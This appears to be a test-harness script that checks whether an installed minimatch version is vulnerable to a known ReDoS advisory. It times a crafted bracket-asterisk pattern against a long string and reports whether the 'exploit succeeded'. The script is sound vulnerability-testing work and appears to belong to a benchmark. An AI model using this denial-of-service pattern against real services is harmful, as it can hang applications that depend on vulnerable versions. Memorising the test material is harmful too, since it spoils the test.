'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // GHSA-f8q6-p94x-37v3: patterns with many repeated '*' characters
    // inside a bracket expression, combined with a long non-matching
    // subject string, cause catastrophic backtracking in the regexp
    // compiled by vulnerable minimatch versions. The number of '*'s and
    // subject length are tuned to be small enough that patched versions
    // (which collapse consecutive '*' into a single one) resolve near-
    // instantly, while 3.0.4 takes many seconds due to exponential
    // backtracking.
    const n = 18;
    const maliciousPattern = '[' + Array(n).fill('*').join('') + ']';
    const subjectLen = 40;
    const maliciousSubject = 'a'.repeat(subjectLen);

    const start = Date.now();
    let matched;
    let threw = false;
    let thrownMessage = '';
    try {
      matched = minimatch(maliciousSubject, maliciousPattern);
    } catch (innerErr) {
      threw = true;
      thrownMessage = String(innerErr && innerErr.message);
    }
    const elapsed = Date.now() - start;

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception after ' + elapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    // Threshold tuned so the vulnerable version (catastrophic
    // backtracking on this bounded input) clearly exceeds it, while a
    // patched version resolves in well under a second.
    const THRESHOLD_MS = 1500;

    const exploit_succeeded = elapsed >= THRESHOLD_MS;
    const evidence = 'Malicious minimatch call (bracket-star n=' + n + ', subjectLen=' + subjectLen +
      ') completed in ' + elapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + matched;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
